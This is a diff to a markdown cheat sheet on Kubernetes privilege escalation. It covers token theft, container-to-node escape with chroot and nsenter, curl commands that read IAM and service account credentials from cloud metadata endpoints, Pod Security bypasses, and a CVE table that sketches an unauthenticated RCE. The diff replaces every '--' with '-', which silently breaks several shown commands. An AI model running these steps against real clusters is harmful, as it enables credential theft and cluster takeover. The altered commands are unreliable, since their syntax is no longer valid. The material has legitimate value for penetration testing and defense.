@@ -1,6 +1,6 @@
 # Kubernetes Privilege Escalation Techniques
 
-Techniques for escalating privileges within Kubernetes clusters -- from compromised pod to
+Techniques for escalating privileges within Kubernetes clusters - from compromised pod to
 cluster-admin, from node access to secret extraction, from RBAC misconfig to full control.
 
 ---
@@ -71,7 +71,7 @@ Tokens are now projected (time-limited, audience-bound). Still auto-mounted by d
 # Check if token is bound (has expiration)
 # Decode the JWT (middle section)
 echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
-# Look for "exp" field -- if present, token expires
+# Look for "exp" field - if present, token expires
 ```
 
 ### Token Theft from Other Pods (with node access)
@@ -111,7 +111,7 @@ done
 | `update/patch pods` | Inject containers, change images |
 | `create/update daemonsets` | Run on every node |
 | `exec` on pods | Shell into any pod in the namespace |
-| Wildcard `*` on verbs/resources | Everything -- check for this first |
+| Wildcard `*` on verbs/resources | Everything - check for this first |
 
 ### Exploiting create/update RoleBindings
 
@@ -184,7 +184,7 @@ spec:
   #   kubernetes.io/hostname: target-node
 ```
 
-Then: `kubectl exec -it pwned -- chroot /host bash`
+Then: `kubectl exec -it pwned - chroot /host bash`
 
 ### Escape to Node via nsenter
 
@@ -192,7 +192,7 @@ If `hostPID: true`:
 
 ```bash
 # Enter all namespaces of host PID 1
-nsenter -t 1 -m -u -i -n -p -- /bin/bash
+nsenter -t 1 -m -u -i -n -p - /bin/bash
 ```
 
 ### Stealing Secrets via Pod
@@ -339,12 +339,12 @@ ls /etc/kubernetes/manifests/
 ### Cloud IMDS from Node
 
 ```bash
-# AWS -- get node's IAM role credentials
+# AWS - get node's IAM role credentials
 curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
 ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
 curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
 
-# GCP -- get node's service account token
+# GCP - get node's service account token
 curl -s -H "Metadata-Flavor: Google" \
   "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
 ```
@@ -367,12 +367,12 @@ kubectl get ns TARGET_NAMESPACE -o jsonpath='{.metadata.labels}' | python3 -m js
 
 ### Bypass Strategies
 
-- **No label = no enforcement** -- check if the namespace has PSS labels at all
-- **warn/audit only** -- pods still run, just generate warnings
-- **Create pod in unlabeled namespace** -- if you can create namespaces
-- **Namespace label manipulation** -- if you can update namespace labels, change enforcement to `privileged`
-- **Ephemeral containers** -- may bypass some checks (depends on admission config)
-- **Static pods on nodes** -- bypass all admission (direct kubelet, not API)
+- **No label = no enforcement** - check if the namespace has PSS labels at all
+- **warn/audit only** - pods still run, just generate warnings
+- **Create pod in unlabeled namespace** - if you can create namespaces
+- **Namespace label manipulation** - if you can update namespace labels, change enforcement to `privileged`
+- **Ephemeral containers** - may bypass some checks (depends on admission config)
+- **Static pods on nodes** - bypass all admission (direct kubelet, not API)
 
 ---
 
@@ -380,7 +380,7 @@ kubectl get ns TARGET_NAMESPACE -o jsonpath='{.metadata.labels}' | python3 -m js
 
 | CVE | CVSS | Component | Impact |
 |-----|:----:|-----------|--------|
-| CVE-2025-1974 | 9.8 | ingress-nginx admission controller | **IngressNightmare**: unauth RCE via NGINX config injection. No creds needed -- send malicious AdmissionReview to webhook, upload shared lib via body buffering, load via ssl_engine. Reads all cluster secrets. 40%+ of cloud envs vulnerable. Fixed in ingress-nginx 1.11.5/1.12.1. |
+| CVE-2025-1974 | 9.8 | ingress-nginx admission controller | **IngressNightmare**: unauth RCE via NGINX config injection. No creds needed - send malicious AdmissionReview to webhook, upload shared lib via body buffering, load via ssl_engine. Reads all cluster secrets. 40%+ of cloud envs vulnerable. Fixed in ingress-nginx 1.11.5/1.12.1. |
 | CVE-2024-10220 | 8.1 | kubelet gitRepo volume | Arbitrary command exec on host via malicious git hooks in gitRepo volume. Fixed in 1.28.12/1.29.7/1.30.3. |
 | nodes/proxy GET | N/A | RBAC/kubelet proxy | `nodes/proxy` GET enables exec into any pod via WebSocket upgrade. Monitoring SAs (Prometheus, Alloy) commonly have this. K8s team: "Won't Fix, Working as Intended." Fine-grained perms expected in k8s 1.36 (Apr 2026). |
 | CVE-2024-3177 | 2.7 | SA admission plugin | Bypass mountable secrets policy via envFrom in init/ephemeral containers. Fixed in 1.27.13/1.28.9/1.29.4. |
